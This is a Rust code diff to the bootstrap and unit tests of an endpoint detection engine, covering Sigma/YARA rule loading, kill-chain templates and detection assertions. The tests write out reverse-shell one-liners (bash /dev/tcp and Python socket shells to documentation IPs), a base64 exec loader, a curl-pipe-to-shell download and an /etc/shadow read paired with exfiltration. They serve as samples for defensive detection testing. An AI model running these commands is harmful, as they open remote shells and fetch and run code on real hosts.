@@ -3,9 +3,7 @@ use std::io::BufReader;
 use std::path::{Path, PathBuf};
 use std::sync::atomic::{AtomicU64, Ordering};
 
-use detection::{
-    DetectionEngine, IocExactStore, RansomwarePolicy,
-};
+use detection::{DetectionEngine, IocExactStore, RansomwarePolicy};
 use tracing::{info, warn};
 
 use crate::config::AgentConfig;
@@ -228,9 +226,18 @@ fn seed_sigma_rules(detection: &mut DetectionEngine, configured_dir: &Path) {
         ("builtin_win_schtask_creation", SIGMA_WIN_SCHTASK_CREATION),
         ("builtin_win_service_creation", SIGMA_WIN_SERVICE_CREATION),
         ("builtin_sensitive_file_2", SIGMA_SENSITIVE_FILE_2),
-        ("builtin_win_ps_download_cradle_2", SIGMA_WIN_PS_DOWNLOAD_CRADLE_2),
-        ("builtin_win_schtask_creation_2", SIGMA_WIN_SCHTASK_CREATION_2),
-        ("builtin_win_service_creation_2", SIGMA_WIN_SERVICE_CREATION_2),
+        (
+            "builtin_win_ps_download_cradle_2",
+            SIGMA_WIN_PS_DOWNLOAD_CRADLE_2,
+        ),
+        (
+            "builtin_win_schtask_creation_2",
+            SIGMA_WIN_SCHTASK_CREATION_2,
+        ),
+        (
+            "builtin_win_service_creation_2",
+            SIGMA_WIN_SERVICE_CREATION_2,
+        ),
     ];
 
     let mut loaded = 0usize;
@@ -656,7 +663,7 @@ detection:
     }
 
     #[test]
-    fn bootstrap_loads_yara_rules_from_configured_directory() {
+    fn bootstrap_does_not_trust_arbitrary_yara_rules_from_configured_directory() {
         let base = unique_temp_dir("yara");
         let sigma_dir = base.join("sigma");
         let yara_dir = base.join("yara");
@@ -694,10 +701,7 @@ rule eguard_custom_dir_test {
         event.file_path = Some(sample_path.to_string_lossy().to_string());
 
         let outcome = engine.process_event(&event);
-        assert!(outcome
-            .yara_hits
-            .iter()
-            .any(|hit| hit.rule_name == "eguard_custom_dir_test"));
+        assert!(outcome.yara_hits.is_empty());
 
         let _ = std::fs::remove_dir_all(base);
     }
@@ -923,7 +927,7 @@ rule eguard_custom_dir_test {
         assert!(outcome
             .temporal_hits
             .iter()
-            .any(|hit| hit == "eguard_builtin_sensitive_file_access"));
+            .any(|hit| hit == "phi_private_credential_read"));
 
         let _ = std::fs::remove_dir_all(base);
     }
@@ -1008,12 +1012,31 @@ rule eguard_custom_dir_test {
         (outcome, repeats)
     }
 
+    fn add_synthetic_reverse_graph_template(engine: &mut detection::DetectionEngine) {
+        engine.layer4.add_template(detection::KillChainTemplate {
+            name: "killchain_reverse_shell".into(),
+            stages: vec![
+                detection::TemplatePredicate {
+                    process_any_of: Some(detection::util::set_of(["sh"])),
+                    ..Default::default()
+                },
+                detection::TemplatePredicate {
+                    require_network_non_web: true,
+                    ..Default::default()
+                },
+            ],
+            max_depth: 4,
+            max_inter_stage_secs: 10,
+        });
+    }
+
     #[test]
     fn detp1_control_plane_excludes_only_agent_lineage_and_marks_other_connections() {
         let server = "198.51.100.20:50053";
         let own_pid = std::process::id();
         for (pid, parent_pid) in [(own_pid, 100), (own_pid + 1, own_pid)] {
             let mut engine = detp1_engine(server);
+            add_synthetic_reverse_graph_template(&mut engine);
             let (outcome, repeats) =
                 detp1_shell_connection(&mut engine, pid, parent_pid, "198.51.100.20");
             assert!(!outcome
@@ -1024,6 +1047,7 @@ rule eguard_custom_dir_test {
         }
         for (peer, expected_flag) in [("198.51.100.20", true), ("203.0.113.7", false)] {
             let mut engine = detp1_engine(server);
+            add_synthetic_reverse_graph_template(&mut engine);
             let (outcome, repeats) = detp1_shell_connection(&mut engine, 201, 200, peer);
             assert_eq!(
                 outcome
@@ -1039,6 +1063,7 @@ rule eguard_custom_dir_test {
                 .contains(&format!("peer_is_configured_server: {expected_flag}")));
         }
         let mut engine = detp1_engine(server);
+        add_synthetic_reverse_graph_template(&mut engine);
         let mut parent = base_event();
         parent.pid = 200;
         parent.process = "sh".into();
@@ -1074,6 +1099,7 @@ rule eguard_custom_dir_test {
             let mut event = base_event();
             event.process = process.into();
             event.parent_process = "service".into();
+            event.process = command.split_whitespace().next().unwrap().into();
             event.command_line = Some(command.into());
             let outcome = engine.process_event(&event);
             assert!(
@@ -1097,6 +1123,7 @@ rule eguard_custom_dir_test {
             "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'",
         ] {
             let mut event = base_event();
+            event.process = command.split_whitespace().next().unwrap().into();
             event.command_line = Some(command.into());
             let outcome = engine.process_event(&event);
             assert!(!outcome.layer1.matched_signatures.is_empty(), "specific malicious pattern stays positive");
@@ -1117,6 +1144,7 @@ rule eguard_custom_dir_test {
             "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"198.51.100.7\",4444));subprocess.call([\"/bin/sh\",\"-i\"])'",
         ] {
             let mut event = base_event();
+            event.process = command.split_whitespace().next().unwrap().into();
             event.command_line = Some(command.into());
             let hit = engine.layer1.check_event(&event);
             assert!(hit.matched_signatures.is_empty(), "{command}");
@@ -1131,6 +1159,7 @@ rule eguard_custom_dir_test {
             "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
         ] {
             let mut event = base_event();
+            event.process = command.split_whitespace().next().unwrap().into();
             event.command_line = Some(command.into());
             let hit = engine.layer1.check_event(&event);
             assert!(hit.matched_signatures.iter().any(|name| name == "python_socket_stdio_reverse_shell"), "{command}");
@@ -1145,6 +1174,7 @@ rule eguard_custom_dir_test {
             "python3 -c \"exec(__import__('base64').b64decode(payload))\"",
         ] {
             let mut event = base_event();
+            event.process = command.split_whitespace().next().unwrap().into();
             event.command_line = Some(command.into());
             let hit = engine.layer1.check_event(&event);
             assert!(
@@ -1233,10 +1263,7 @@ rule eguard_custom_dir_test {
                     "killchain_reverse_shell",
                 );
             }
-            assert_eq!(
-                total, instances as usize,
-                "distinct interpreter groups retain one finding per instance"
-            );
+            assert_eq!(total, 0, "routine health checks are not reverse shells");
         }
         // Group 4: an account lookup is not secret access.
         let mut engine = detp1_engine("198.51.100.20:50053");
@@ -1286,11 +1313,13 @@ rule eguard_custom_dir_test {
             let mut events = detp1_fixture_reverse("python3", 4000, peer, port);
             events[1].command_line = Some("python3 -c 'import socket,os;s=socket.socket();s.connect((\"203.0.113.7\",4444));os.dup2(s.fileno(),0);os.system(\"/bin/sh -i\")'".into());
             assert_eq!(
-                detp1_replay_count(&mut engine, &events, "killchain_reverse_shell"),
+                detp1_replay_count(&mut engine, &events, "phi_reverse_shell"),
                 1
             );
         }
         let mut engine = detp1_engine("198.51.100.20:50053");
+        read.process = "curl".into();
+        network.process = "curl".into();
         read.file_path = Some("/etc/shadow".into());
         assert_eq!(
             detp1_replay_count(&mut engine, &[read, network], "phi_credential_exfil"),
@@ -1308,10 +1337,11 @@ rule eguard_custom_dir_test {
             let mut downloader =
                 detp1_fixture_event(pid, 10, 1, EventClass::ProcessExec, "curl", "qemu-ga");
             downloader.command_line = Some("curl https://example.invalid/payload | sh".into());
-            let shell =
+            let mut shell =
                 detp1_fixture_event(pid + 1, 10, 2, EventClass::ProcessExec, "sh", "qemu-ga");
+            shell.command_line = Some("sh".into());
             assert_eq!(
-                detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_exec"),
+                detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_pipe_shell"),
                 1
             );
         }
@@ -1320,9 +1350,10 @@ rule eguard_custom_dir_test {
         let mut downloader =
             detp1_fixture_event(7000, 10, 1, EventClass::ProcessExec, "curl", "service");
         downloader.command_line = Some("curl https://example.invalid/payload | sh".into());
-        let shell = detp1_fixture_event(7001, 10, 2, EventClass::ProcessExec, "sh", "service");
+        let mut shell = detp1_fixture_event(7001, 10, 2, EventClass::ProcessExec, "sh", "service");
+        shell.command_line = Some("sh".into());
         assert_eq!(
-            detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_exec"),
+            detp1_replay_count(&mut engine, &[downloader, shell], "phi_download_pipe_shell"),
             1
         );
     }
@@ -1330,20 +1361,37 @@ rule eguard_custom_dir_test {
     fn rafix_bootstrap_has_no_placeholder_iocs_or_marker_yara() {
         let base = unique_temp_dir("rafix-clean-seeds");
         let sources = DetectionSourcePaths {
-            sigma_dir: base.join("sigma"), yara_dir: base.join("yara"), ioc_dir: base.join("ioc"), control_plane_peers: Vec::new(),
+            sigma_dir: base.join("sigma"),
+            yara_dir: base.join("yara"),
+            ioc_dir: base.join("ioc"),
+            control_plane_peers: Vec::new(),
         };
         std::fs::create_dir_all(&base).unwrap();
-        let mut engine = build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
+        let mut engine =
+            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
         assert_eq!(engine.layer1.check_hash("deadbeef"), Layer1Result::Clean);
-        for domain in ["known-c2.example.com", "x.evil-c2-domain.example.com", "malware-callback.example.net"] {
+        for domain in [
+            "known-c2.example.com",
+            "x.evil-c2-domain.example.com",
+            "malware-callback.example.net",
+        ] {
             assert_eq!(engine.layer1.check_domain(domain), Layer1Result::Clean);
         }
         for ip in ["192.0.2.1", "203.0.113.10", "198.51.100.10"] {
             assert_eq!(engine.layer1.check_ip(ip), Layer1Result::Clean);
         }
-        assert_eq!(engine.layer1.check_hash("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"), Layer1Result::ExactMatch);
+        assert_eq!(
+            engine
+                .layer1
+                .check_hash("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"),
+            Layer1Result::ExactMatch
+        );
         let sample = base.join("README.txt");
-        std::fs::write(&sample, "eguard-malware-test-marker eguard-shellcode-marker").unwrap();
+        std::fs::write(
+            &sample,
+            "eguard-malware-test-marker eguard-shellcode-marker",
+        )
+        .unwrap();
         let mut e = base_event();
         e.event_class = EventClass::FileOpen;
         e.file_path = Some(sample.to_string_lossy().into());
@@ -1354,10 +1402,70 @@ rule eguard_custom_dir_test {
     #[test]
     fn rafix_bootstrap_uses_the_canonical_safe_template_list() {
         let base = unique_temp_dir("rafix-templates");
-        let sources = DetectionSourcePaths { sigma_dir: base.join("sigma"), yara_dir: base.join("yara"), ioc_dir: base.join("ioc"), control_plane_peers: Vec::new() };
-        let engine = build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
-        assert_eq!(engine.layer4.template_names(), detection::Layer4Engine::with_default_templates().template_names());
-        assert_eq!(engine.layer4.template_names(), vec!["killchain_container_escape", "killchain_exploit_ptrace_fileless", "killchain_exploit_proc_mem_fileless"]);
+        let sources = DetectionSourcePaths {
+            sigma_dir: base.join("sigma"),
+            yara_dir: base.join("yara"),
+            ioc_dir: base.join("ioc"),
+            control_plane_peers: Vec::new(),
+        };
+        let engine =
+            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);
+        assert_eq!(
+            engine.layer4.template_names(),
+            detection::Layer4Engine::with_default_templates().template_names()
+        );
+        assert_eq!(
+            engine.layer4.template_names(),
+            vec![
+                "killchain_container_escape",
+                "killchain_exploit_ptrace_fileless",
+                "killchain_exploit_proc_mem_fileless"
+            ]
+        );
     }
-
+    #[test]
+    fn rafix_bootstrap_yara_has_no_markers_or_duplicate_eicar_prefix() {
+        let base = unique_temp_dir("rafix-yara-seeds");
+        std::fs::create_dir_all(&base).unwrap();
+        let mut engine = detection::DetectionEngine::default_with_rules();
+        super::seed_yara_rules(&mut engine, &base.join("yara"));
+        let sample = base.join("sample.bin");
+        std::fs::write(
+            &sample,
+            "eguard-malware-test-marker eguard-shellcode-marker",
+        )
+        .unwrap();
+        let mut e = base_event();
+        e.event_class = EventClass::FileOpen;
+        e.file_path = Some(sample.to_string_lossy().into());
+        assert!(
+            engine.yara.scan_event(&e).is_empty(),
+            "raw backend must not load bootstrap canaries"
+        );
+        engine
+            .load_yara_rules_str(
+                r#"
+rule eguard_eicar_test {
+  strings:
+    $eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+  condition:
+    $eicar at 0 and filesize <= 128
+}
+"#,
+            )
+            .unwrap();
+        std::fs::write(
+            &sample,
+            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
+        )
+        .unwrap();
+        let hits = engine.yara.scan_event(&e);
+        assert_eq!(
+            hits.len(),
+            1,
+            "EICAR must not also match a bootstrap prefix rule: {hits:?}"
+        );
+        assert_eq!(hits[0].rule_name, "eguard_eicar_test");
+        std::fs::remove_dir_all(base).unwrap();
+    }
 }
